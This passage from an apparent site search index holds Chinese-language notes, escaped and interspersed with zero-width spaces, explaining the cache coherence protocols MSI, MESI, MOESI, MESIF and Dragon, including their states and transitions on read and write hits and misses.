\u200b\u65f6\u200b\uff0c\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u5199\u5165\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u662f\u200b Valid/Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#msi","title":"MSI \u200b\u534f\u8bae","text":"<p>MSI \u200b\u534f\u8bae\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u8868\u793a\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u4fee\u6539\u200b\uff0c\u200b\u548c\u200b\u5185\u5b58\u200b\u91cc\u200b\u4e0d\u200b\u4e00\u81f4\u200b</li> <li>Shared\uff1a\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u4e00\u5230\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u540c\u65f6\u200b\u5904\u5728\u200b Shared \u200b\u72b6\u6001\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u90fd\u200b\u662f\u200b Invalid\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b Shared\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b Dirty\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u548c\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u73b0\u5728\u200b\u662f\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u5219\u200b\u8981\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7684\u200b Shared \u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4fee\u6539\u200b\u6570\u636e\u200b\uff0c\u200b\u72b6\u6001\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Modified/Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u4fee\u6539\u200b\u672c\u5730\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u5165\u200b\uff0c\u200b\u7136\u540e\u200b\u4fee\u6539\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#mesi","title":"MESI \u200b\u534f\u8bae","text":"<p>MESI \u200b\u534f\u8bae\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u79cd\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u540c\u65f6\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u4f1a\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u90fd\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff1b\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Exclusive \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u540c\u65f6\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5426\u5219\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\u3002\u200b\u7136\u540e\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u503c\u5f97\u4e00\u63d0\u7684\u662f\u200b\uff0cShared \u200b\u72b6\u6001\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u8868\u793a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b\uff1a\u200b\u6bd4\u5982\u200b\u672c\u6765\u200b\u6709\u200b\u4e24\u4e2a\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u56e0\u4e3a\u200b\u7f13\u5b58\u200b\u66ff\u6362\u200b\u53d8\u6210\u200b\u4e86\u200b Invalid\uff0c\u200b\u90a3\u4e48\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u53d7\u5230\u200b\u901a\u77e5\u200b\u53d8\u6210\u200b Exclusive \u200b\u7684\u200b\u3002Exclusive \u200b\u7684\u200b\u8bbe\u7f6e\u200b\u662f\u200b\u4e3a\u4e86\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5f53\u200b\u6570\u636e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u6838\u5fc3\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u6b21\u200b Read miss \u200b\u4f1a\u200b\u53d1\u9001\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4e00\u76f4\u200b\u5728\u200b Exclusive/Modified \u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u53d1\u9001\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#moesi","title":"MOESI \u200b\u534f\u8bae","text":"<p>MOESI \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e94\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Owned\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ea\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0cM \u200b\u548c\u200b E \u200b\u662f\u200b\u72ec\u5360\u200b\u7684\u200b\uff0c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u91cc\u200b\u53ea\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b S\uff0c\u200b\u6216\u8005\u200b\u591a\u4e2a\u200b S \u200b\u52a0\u200b\u4e00\u4e2a\u200b O\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b O\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u72b6\u6001\u200b\u8f6c\u79fb\u200b\u4e0e\u200b MESI \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff1a\u200b\u5f53\u200b\u6838\u5fc3\u200b\u5199\u5165\u200b Owned \u200b\u72b6\u6001\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u200b\uff0c\u200b\u6709\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff1a1\uff09\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b Shared \u200b\u7684\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff1b2\uff09\u200b\u628a\u200b\u5176\u4ed6\u200b Shared \u200b\u7f13\u5b58\u200b\u8bbe\u200b\u4e3a\u200b Invalid\uff0c\u200b\u7136\u540e\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5728\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u4ece\u200b Owned \u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u800c\u200b\u4e0d\u7528\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002\u200b\u5b83\u200b\u76f8\u6bd4\u200b MESI \u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5199\u200b\u56de\u200b\u5185\u5b58\u200b\u7684\u200b\u6b21\u6570\u200b\u3002</p> <p>AMD64 \u200b\u6587\u6863\u200b\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u5c31\u662f\u200b MOESI \u200b\u534f\u8bae\u200b\u3002AMBA ACE \u200b\u534f\u8bae\u200b\u5176\u5b9e\u200b\u4e5f\u200b\u662f\u200b MOESI \u200b\u534f\u8bae\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u6362\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u540d\u79f0\u200b\uff0c\u200b\u8868\u793a\u200b\u53ef\u4ee5\u200b\u517c\u5bb9\u200b MEI/MESI/MOESI \u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u534f\u8bae\u200b\u3002ACE \u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cSharedClean \u200b\u5e76\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6bd4\u5982\u8bf4\u200b\u548c\u200b SharedDirty \u200b\u7f13\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5b83\u200b\u53ea\u662f\u200b\u8bf4\u200b\u7f13\u5b58\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5199\u56de\u200b\u5185\u5b58\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#mesif","title":"MESIF \u200b\u534f\u8bae","text":"<p>MESIF \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e94\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> <li>Forward\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b\uff0c\u200b\u4e14\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u8bf7\u6c42\u200b</li> </ol> <p>MESIF \u200b\u76f8\u6bd4\u200b MESI \u200b\u7684\u200b\u533a\u522b\u200b\u662f\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e86\u200b Forward \u200b\u72b6\u6001\u200b\uff1aForward \u200b\u5176\u5b9e\u200b\u662f\u200b\u7279\u6b8a\u200b\u7684\u200b Shared\uff0c\u200b\u4e3b\u8981\u200b\u662f\u200b\u8003\u8651\u200b\u5230\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Shared \u200b\u72b6\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6765\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b\u54ea\u4e2a\u200b Shared \u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002MESIF \u200b\u534f\u8bae\u200b\u4e2d\u200b\uff0cForward \u200b\u5c31\u662f\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b Shared\uff0c\u200b\u6240\u4ee5\u200b Forward \u200b\u6700\u200b\u591a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u5176\u4ed6\u200b Shared \u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7b80\u5316\u200b\u4e86\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u591a\u4e2a\u200b Cache \u200b\u5c5e\u4e8e\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u6ca1\u6709\u200b Forward\uff0c\u200b\u90a3\u4e48\u200b\u65b0\u200b\u7684\u200b Cache \u200b\u8bf7\u6c42\u200b\u5c31\u200b\u4f1a\u200b\u53d1\u9001\u5230\u200b\u5185\u5b58\u200b\u91cc\u200b\uff0c\u200b\u7531\u4e8e\u200b Shared \u200b\u7684\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b Shared \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b Cache \u200b\u4f1a\u200b\u8fdb\u5165\u200b Forward \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#dragon","title":"Dragon \u200b\u534f\u8bae","text":"<p>Dragon \u200b\u534f\u8bae\u200b\u662f\u200b\u4e00\u4e2a\u200b\u57fa\u4e8e\u200b\u66f4\u65b0\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u610f\u5473\u7740\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u628a\u200b\u66f4\u65b0\u200b\u7684\u200b\u6570\u636e\u200b\u540c\u6b65\u200b\u5230\u200b\u62e5\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u5176\u4ed6\u200b\u6838\u5fc3\u200b\u3002\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Exclusive clean(E)\uff1a\u200b\u72ec\u5360\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b</li> <li>Shared clean(Sc)\uff1a\u200b\u6570\u636e\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u4e0d\u662f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5199\u5165\u200b\u8be5\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b</li> <li>Shared modified(Sm)\uff1a\u200b\u6570\u636e\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u8bbe\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5199\u5165\u200b\u8be5\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u524d\u9762\u200b MOESI \u200b\u534f\u8bae\u200b\u7684\u200b Owner \u200b\u72b6\u6001\u200b</li> <li>Modify(M)\uff1a\u200b\u72ec\u5360\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0d\u200b\u4e00\u81f4\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cE \u200b\u548c\u200b M \u200b\u90fd\u200b\u662f\u200b\u72ec\u5360\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u540c\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\u82e5\u5e72\u4e2a\u200b Sc \u200b\u548c\u200b\u4e00\u4e2a\u200b Sm\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u6709\u200b\u7f13\u5b58\u200b\u5df2\u7ecf\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\uff0c\u200b\u5219\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\u5e76\u200b\u8f6c\u5230\u200b Exclusive clean \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u5728\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5219\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5c06\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8f6c\u79fb\u200b\u5230\u200b Shared clean/Shared modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u8be5\u200b\u7f13\u5b58\u200b\u8f6c\u79fb\u200b\u5230\u200b Shared clean \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u540c\u6837\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8f6c\u200b\u5230\u200b Modify \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u4e0d\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u5c31\u200b\u8fdb\u5165\u200b Shared modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba9\u200b\u539f\u6765\u200b Shared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Shared clean \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Shared modified\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u9700\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff1b\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Shared clean\uff0c\u200b\u5219\u200b\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8ba9\u200b\u539f\u6765\u200b Shared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Shared clean \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Exclusive 